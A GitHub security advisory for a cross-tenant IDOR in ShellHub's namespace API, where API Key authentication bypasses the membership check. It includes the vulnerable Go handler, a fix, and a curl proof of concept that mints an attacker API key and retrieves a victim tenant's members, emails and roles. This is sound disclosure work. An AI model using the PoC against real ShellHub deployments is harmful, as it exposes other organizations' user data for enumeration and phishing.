# [M] ShellHub has cross-tenant IDOR in `GET /api/namespaces/:tenant` via API Key bypasses  membership check

## Summary
Severity: Medium
Advisory: GHSA-vwx9-7qcf-gg7f
CVE: CVE-2026-44426
CWE: CWE-639
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-vwx9-7qcf-gg7f
Type: github-advisory

## Affected
- Go: `github.com/shellhub-io/shellhub` — affected >=0 <0.24.2

## Details
## Summary
`GET /api/namespaces/:tenant` returns the full namespace object — including the members list (user IDs, e-mails, roles), settings, and device counts — to any caller authenticated by an **API Key**, for any tenant, regardless of the API Key's own tenant scope.

The handler conditionally skips the membership check when the user ID (`X-ID`) is absent, which is exactly the case for API Key authentication.

## Affected versions
ShellHub Community v0.24.1 (validated).

## Root cause
`api/routes/nsadm.go:75-102` — membership check is skipped when `c.ID()` is nil:

  ```go
  var uid string
  if c.ID() != nil {
      uid = c.ID().ID
  }

  ns, err := h.service.GetNamespace(c.Ctx(), req.Tenant)
  if err != nil || ns == nil {
      return c.NoContent(http.StatusNotFound)
  }

  if uid != "" {                              // ⚠️ skipped when API Key is used
      if _, ok := ns.FindMember(uid); !ok {
          return c.NoContent(http.StatusForbidden)
      }
  }

  return c.JSON(http.StatusOK, ns)
  ```

  `AuthRequest` (`api/routes/auth.go:53-64`) sets only `X-Tenant-ID`, `X-Role`,
  and `X-API-KEY` for API Key authentication — never `X-ID`. So
  `c.Request().Header.Get("X-ID")` returns `""`, `c.ID()` returns `nil`, and
  the membership check is bypassed.

## Proof of concept (validated live against v0.24.1)

  ```bash
  # Attacker authenticates in their own namespace and mints an API Key
  ATTACKER_TOKEN=$(curl -s -X POST http://target/api/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"attacker","password":"..."}' | jq -r .token)

  ATTACKER_KEY=$(curl -s -X POST http://target/api/namespaces/api-key \
    -H "Authorization: Bearer $ATTACKER_TOKEN" \
    -H 'Content-Type: application/json' \
    -d '{"name":"poc","expires_at":30}' | jq -r .id)

  # Baseline: same request with JWT is correctly blocked
  curl -i http://target/api/namespaces/<victim-tenant-uuid> \
    -H "Authorization: Bearer $ATTACKER_TOKEN"
  # Observed: HTTP 403 (correct)

  # Exploit: same request with API Key returns full namespace
  curl -i http://target/api/namespaces/<victim-tenant-uuid> \
    -H "X-API-Key: $ATTACKER_KEY"
  # Observed: HTTP 200 + {name, owner, tenant_id, members:[{id,email,role,added_at},...],
  #                      settings, max_devices, devices_accepted_count, type, created_at}
  ```

## Impact
  - Enumeration of any ShellHub namespace by tenant UUID.
  - Disclosure of member e-mails, user IDs, and roles → user enumeration and targeted phishing against the victim organization.
  - Disclosure of namespace settings (session recording on/off, announcement text), device counts, namespace type, owner identity.

## Suggested fix
Two layers:

  1. **Primary** — enforce caller-tenant match before returning the namespace, covering both JWT and API Key callers:

     ```go
     // nsadm.go GetNamespace
     if c.Tenant() != nil && c.Tenant().ID != req.Tenant {
         return c.NoContent(http.StatusForbidden)
     }
     ```

## References
- https://github.com/shellhub-io/shellhub/security/advisories/GHSA-vwx9-7qcf-gg7f
- https://nvd.nist.gov/vuln/detail/CVE-2026-44426
- https://github.com/shellhub-io/shellhub
